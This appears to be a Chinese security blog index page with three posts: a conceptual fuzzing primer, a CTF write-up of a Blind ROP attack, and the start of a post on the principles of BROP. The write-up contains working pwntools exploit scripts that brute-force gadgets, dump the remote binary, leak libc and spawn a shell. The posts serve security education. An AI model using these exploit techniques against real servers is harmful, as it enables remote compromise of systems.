<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/9/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-模糊测试基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2017-02-22T11:59:53.000Z" itemprop="datePublished">2017-02-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">模糊测试基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这篇文章主要是对模糊测试的一个入门级的认识，没有太多干货，主要是一些概念性的东西，为以后深入学习做一点铺垫。<br>用于模糊测试的模糊测试器分为两类：</p>
<ul>
<li>一类是<code>基于变异（mutation-based）</code>的模糊测试器，这一类测试器通过对已有的数据样本进行变异来创建测试用例</li>
<li>另一类是<code>基于生成（generation-based）</code>的模糊测试器，该类测试器为被测系统使用的协议或是文件格式建模，基于模型生成输入并据此创建测试用例。</li>
</ul>
<h2 id="模糊测试各阶段"><a href="#模糊测试各阶段" class="headerlink" title="模糊测试各阶段"></a>模糊测试各阶段</h2><ol>
<li>确定测试目标</li>
<li>确定输入向量</li>
<li>生成模糊测试数据</li>
<li>执行模糊测试数据</li>
<li>监视异常</li>
<li>判定发现的漏洞是否可能被利用</li>
</ol>
<h2 id="模糊测试方法"><a href="#模糊测试方法" class="headerlink" title="模糊测试方法"></a>模糊测试方法</h2><ol>
<li><strong>预生成测试用例：</strong>理解规约，生成测试边界条件或是违反规约的测试用例。</li>
<li><strong>随机生成输入：</strong>简单地向目标应用发送伪随机数据。</li>
<li><strong>手工协议变异测试：</strong>测试者就是模糊测试器。</li>
<li><strong>变异或强制性测试：</strong>从一个有效的协议样本或是数据格式开始，持续不断地打乱数据包或是文件中的每一个字节、字、双字或是字符串。</li>
<li><strong>自动协议生成测试：</strong>理解协议规约或文件定义，创建文法，识别出数据包或文件中的动态和静态部分，动态部分可以被模糊化变量替代。</li>
</ol>
<h2 id="模糊测试器类型"><a href="#模糊测试器类型" class="headerlink" title="模糊测试器类型"></a>模糊测试器类型</h2><ol>
<li>本地模糊器<br>命令行模糊测试器<br>环境变量模糊测试器<br>文件格式模糊测试器  </li>
<li>远程模糊测试器<br>网络协议模糊测试器<br>Web应用模糊测试器<br>Web浏览器模糊测试器  </li>
<li>内存模糊测试器  </li>
</ol>
<p>网络协议模糊测试：<br><strong>简单协议：</strong>仅有简单认证或没有认证，通常基于可打印的ASCII字符而不是二进制数据；<br><strong>复杂协议：</strong>通常由二进制数据和偶尔包含人可读的ASCII字符串构成，认证可能通过加密或是某种形式的混淆来实现。（SPIKE、Peach模糊测试框架）</p>
<h2 id="数据表示和分析"><a href="#数据表示和分析" class="headerlink" title="数据表示和分析"></a>数据表示和分析</h2><p><strong>协议：</strong>在两台计算机端点之间控制或使能连接，通信和数据传输的约定或标准。<br><strong>协议中的字段：</strong>协议的主要作用就是定义”协议中各部分数据如何被解释”，设计协议时有三种典型的方法：<code>定长字段</code>，<code>变长字段</code>和<code>分隔字段</code>。<br><strong>简单文本协议：</strong>使用的用于通信的数据值都在可打印字符范围内。<br><strong>二进制协议：</strong>二进制协议数据流中都是原始数据，而不是可读的文本，如果不理解协议，协议数据包就没有任何意义。二进制协议通常使用<code>数据块</code>。块最前面是块大小的值，后面是块中的实际数据。对模糊测试来说，数据块是一个重要的概念。如果打算创建一个模糊测试器来向数据块中注入数据，就必须仔细调整块大小的值，否则，接收到数据的应用就理解不了数据包。</p>
<h2 id="网络协议模糊测试"><a href="#网络协议模糊测试" class="headerlink" title="网络协议模糊测试"></a>网络协议模糊测试</h2><p>对网络协议进行模糊测试也需要识别出可被攻击的接口，通过变异或生成方式得到能够触发错误的模糊测试值，然后将这些模糊测试值发送给目标应用，监视目标应用的错误。<br>现有的网络协议模糊测试倾向与采用两种风格：</p>
<ul>
<li>一种风格是采用<code>通用框架</code>，可以对多种协议进行模糊测试。（SPIKE工具和ProtoFuzz工具）</li>
<li>另一种网络模糊测试器的风格是<code>面向特定协议</code>。（ircfuzz、dhcpfuzz、InfigoFTPSStressFuzzer）</li>
</ul>
<p>面向特定协议的模糊测试器通常只是些小脚本或小应用，通用框架则需要更大的开发工作量。</p>
<h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul>
<li><strong>强制（基于变异的）模糊测试</strong><br>在网络模糊测中，测试者通常使用嗅探器，在测试之前使用静态方法或是在运行时使用动态方法抓取合法的协议数据。随后，模糊测试器对抓取到的数据进行变异，将其发送给目标应用。对实现了基本回放攻击保护的协议，简单的强制网络模糊测试除了对初始会话相关的代码（如认证过程）产生效果外，不会有其他任何作用。如果协议包含校验码，模糊测试器还需要能动态更新校验码字段。<br>这种方法适用于私有协议的模糊测试。<br>下一种方法更适合常见的网络协议模糊测试。  </li>
<li><strong>智能强制（基于生成的）模糊测试</strong><br>首先得花精力实际研究<code>协议规范</code>，智能模糊测试器可以依赖用户提供的配置文件，使得模糊测试的过程更智能。用户提供的配置通常包含描述协议语言的元数据。</li>
</ul>
<h2 id="使用SPIKE进行模糊测试"><a href="#使用SPIKE进行模糊测试" class="headerlink" title="使用SPIKE进行模糊测试"></a>使用SPIKE进行模糊测试</h2><p>SPIKE<br>Peach<br>通用目的模糊测试器(GPF)<br>Autodafe</p>
<h2 id="对第三方私有协议进行模糊测试"><a href="#对第三方私有协议进行模糊测试" class="headerlink" title="对第三方私有协议进行模糊测试"></a>对第三方私有协议进行模糊测试</h2><p>通过对客户端和服务器之间的通信数据进行变异来测试，但无法确切知道该协议还有多大比例的部分没有被观察到。为了更好地分析目标协议，可以对客户端和服务器的二进制代码开展<code>逆向工程</code>。逆向工程的代价非常高，只有具有超高技巧的，有经验的工程师才能执行逆向工程。在逆向之前要确保已经充分利用了他人的工作成果，确保已经通过Google检索过相关信息，可能已经有人写过我们所需的<code>非官方文档</code>。<code>Wireshark</code>和<code>Ethereal</code>的源代码中已经包含了许多被彻底研究过的、较为知名的<code>私有协议</code>的定义。  </p>
<h2 id="启发式技术"><a href="#启发式技术" class="headerlink" title="启发式技术"></a>启发式技术</h2><p><strong>代理模糊测试</strong> ProxyFuzzer<br>模糊测试器代理转发客户端和服务器之间的数据<br><strong>改进的代理模糊测试</strong><br><strong>反汇编启发式技术</strong>在进行模糊测试时，使用运行时插桩工具（如调试器）监视被测目标上的代码执行。<br>使用PaiMei逆向工程框架PyDbg组件，可以开发出实现了基本概念的目标监视模糊测试器的反馈调试器。从 <a target="_blank" rel="noopener" href="http://www.fuzzing.org/">http://www.fuzzing.org</a> 上可以下载得到相关的源代码。</p>
<h2 id="生物信息学"><a href="#生物信息学" class="headerlink" title="生物信息学"></a>生物信息学</h2><p><strong>生物信息学：</strong>利用应用数学、信息学、统计学和计算机科学的方法研究生物学问题（通常在分子层上）。<br>生物信息学中最基础的分析是排列两个序列（不管长度是否相同），并找出最大相似度。<br>Protocol Informatics（PI）Python框架是应用生物信息理论进行网络协议分析的框架，它的目标是通过分析大量观察到的数据，自动推断协议的字段边界。<br>PI框架应用了Smith-Waterman（SW）本地序列对齐算法、Needleman-Wunsch（NW）全局序列对齐算法、相似矩阵和进化树方法，成功地从HTTP、TCMP和SMB协议中识别除了协议字段。</p>
<h2 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h2><p><strong>遗传算法（Genetic Algorithm，GA）</strong>是模拟进化软件使用的一种近似搜索技术。<br>对遗传算法而言，通常需要定义以下三方面的内容：</p>
<ul>
<li>表示方法：解决方案（个体）的表示方法。</li>
<li>适应度函数：用来评估得到的方案（个体）对环境适应度的函数。</li>
<li>生产函数：负责变异和让两个方案（个体）交配的函数。</li>
</ul>
<p><strong>reference</strong><br>《模糊测试 强制发掘安全漏洞的利器》</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/02/22/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" data-id="ckhe7o4ns0066chl7fxrufydf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Blind-Return-Oriented-Programming-BROP-Attack攻击实践" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/" class="article-date">
  <time datetime="2017-02-22T07:46:38.000Z" itemprop="datePublished">2017-02-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/">Blind Return Oriented Programming (BROP) Attack攻击实践</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这个攻击的实践以2016年的hctf中的一个pwn题为例。虽然这个例子中没有包含<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">攻击原理</a>的全部细节，但是作为这种攻击的入门还是不错的。<br>这道题目没有给二进制文件，只能采用BROP。<br>1.经过测试，当输入字符超过72字节时，程序不会显示<strong>No password, No game</strong>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试栈溢出大小 72</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">200</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;A&#x27;</span> * i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;No password, no game&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>
<p>2.假设没有开启PIE，则基地址为<code>0x08048000</code>或<code>0x400000</code>。首先尝试0x08048000，没有任何发现，因此判断系统为64位。<br>构造如下payload爆破，发现当<code>i=0x6bd</code>时，程序会重新开始，判断0x4006bd为main地址。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x600</span>, <span class="number">0x1000</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x400000</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>3.因为是64位程序，要实现任意地址泄露，主要需要知道<code>pop rdi; ret</code>和<code>puts@plt</code>的地址。<br>在64位ELF中，通常存在一个<code>pop r15; ret</code>，对应的字节码为<code>41 5f c3</code>，后两个字节码对应指令<code>pop rdi; ret</code>。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x750</span>, <span class="number">0x1000</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    addr = <span class="number">0x400000</span> + i</span><br><span class="line">    <span class="comment"># 寻找BROP Gadget(pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret)</span></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(main)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>得到地址0x4007ba，加8应该就是<code>pop r15; ret</code>的地址了，要确认还需要进一步测试：当一个地址满足如下3个payload都能返回main函数的话，就可以得到一个<code>pop rdi; ret</code>的地址。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(addr<span class="number">-1</span>) + p64(<span class="number">0</span>) + p64(main)</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(addr) + p64(<span class="number">0</span>) + p64(main)</span><br><span class="line">payload3 = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(addr+<span class="number">1</span>) + p64(main)</span><br></pre></td></tr></table></figure>
<p>最终得到<code>pop_rdi_ret</code>地址为0x4007c3。<br>4.构造如下代码爆破<code>puts_plt</code>的地址：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x500</span>, <span class="number">0x1000</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(<span class="number">0x400000</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> r.recvuntil(<span class="string">&#x27;ELF&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="number">0x400000</span>+i)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>如果程序打印前四个字节为<code>\x7fELF</code>，则为<code>puts_plt</code>。得到的地址为0x400565，实际puts_plt为0x400570，并没有什么影响。<br>5.dump代码，用IDA分析  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">len</span>(d))</span><br><span class="line">            r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">            payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_ret) + p64(base+<span class="built_in">len</span>(d)) + p64(puts_plt) + p64(main)</span><br><span class="line">            r.sendline(payload)</span><br><span class="line">            d +=  r.recvline()[:<span class="number">-1</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &gt; <span class="number">0x9bc</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;code.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(d)</span><br><span class="line">    f.close()</span><br><span class="line">    base = <span class="number">0x600e10</span></span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">len</span>(d))</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_ret) + p64(base+<span class="built_in">len</span>(d)) + p64(puts_plt) + p64(main)</span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        d += r.recvline()[:<span class="number">-1</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &gt; <span class="number">0x248</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(d)</span><br><span class="line">    f.close()</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>
<p>dump出的code.bin文件用IDA打开，打开时不能以<code>ELF64</code>打开，要以<code>binary file</code>打开，打开后对段基址rebase一下：Edit-&gt;Segements-&gt;Rebase program，将Value改为0x400000。<br>改完之后找到前面判定的main(0x4006bd)，将光标放在这里，按下<code>p</code>，反汇编为代码。<br>6.exploit  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先泄露出read和puts的got中的地址，根据read和puts的低12位值判断出libc版本</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    read_got = <span class="number">0x601028</span></span><br><span class="line">    puts_got = <span class="number">0x601018</span></span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;A&#x27;</span> * <span class="number">72</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main))</span><br><span class="line">    libc_base = u64(r.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x6f690</span></span><br><span class="line">    system = libc_base + <span class="number">0x45390</span></span><br><span class="line">    binsh = libc_base + <span class="number">0x18c177</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">72</span> + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(main))</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eSf0pUU">题目下载</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/ctf/detail/179.html">http://bobao.360.cn/ctf/detail/179.html</a><br><a target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/02/22/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%AE%9E%E8%B7%B5/" data-id="ckhe7o4kg000schl7dzdw6nza" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Blind-Return-Oriented-Programming-BROP-Attack攻击原理" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" class="article-date">
  <time datetime="2017-02-13T01:15:14.000Z" itemprop="datePublished">2017-02-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">Blind Return Oriented Programming (BROP) Attack攻击原理</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是来自Standford的Andrea Bittau，<a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">相关paper下载</a>。</p>
<h2 id="BROP攻击的目标和前提条件"><a href="#BROP攻击的目标和前提条件" class="headerlink" title="BROP攻击的目标和前提条件"></a>BROP攻击的目标和前提条件</h2><p>目标：通过ROP的方法远程攻击某个应用程序，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX, ASLR, PIE, 以及stack canary等保护，应用程序所在的服务器可以是32位系统或者64位系统。<br>初看这个目标感觉实现起来特别困难。其实这个攻击有两个前提条件的：</p>
<ul>
<li>必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；</li>
<li>服务器进程在crash之后会restart，并且restart的进程不会被re-rand（意味着虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的）。这个需求其实是合理的，因为当前像nginx, MySQL, Apache, OpenSSH, Samba等服务器应用都是符合这种特性的。</li>
</ul>
<h2 id="BROP的攻击流程1-远程dump内存"><a href="#BROP的攻击流程1-远程dump内存" class="headerlink" title="BROP的攻击流程1 - 远程dump内存"></a>BROP的攻击流程1 - 远程dump内存</h2><p>由于不知道被攻击程序的内存布局，所以首先要做的就是通过某种方法从远程服务器dump出该程序的内存到本地，为了做到这点，需要调用一个系统调用<code>write</code>，传入一个socket文件描述符：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="keyword">int</span> sock, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len);</span><br></pre></td></tr></table></figure>
<p>将这条系统调用转换成4条汇编指令，如图所示：<br><img src="/images/brop/asmins.jpg"><br>需要找到四个相应的gadget，然后在栈上构造好这4个gadget的内存地址。<br>问题是我们连内存分布都不知道，如何在内存中找到这4个gadget。特别是当系统部署了ASLR和stack canary等保护机制。<br>所以先将这个问题放一放，先来做一些准备工作。</p>
<h3 id="攻破Stack-Canary防护"><a href="#攻破Stack-Canary防护" class="headerlink" title="攻破Stack Canary防护"></a>攻破Stack Canary防护</h3><p>一种方法是brute-force暴力破解，但这个方法很低效，这里使用一种<code>stack reading</code>的方法：<br>假设这里我们想要overflow的栈的布局：<br><img src="/images/brop/stack.jpg"><br>可以尝试任意多次来判断出overflow的长度（直到进程由于canary被破坏crash了，在这里即为4096+8=4104个字节），之后我们将这4096个字节填上任意值，然后一个一个字节顺序地进行尝试来还原出真实的canary，比如向栈上写入4097个字节的数据，第4097个字节为<code>*</code>，如果<code>*</code>和原来canary中第一个字节相同，则进程不会crash，不相同则会crash；然后用相同的方法试出剩下的字节内容。一个字节有256中可能，最多尝试256*8即可得出canary所有字节：<br><img src="/images/brop/canary.jpg"><br>同样也可以得到保存的<code>frame pointer</code>和<code>return address</code>。</p>
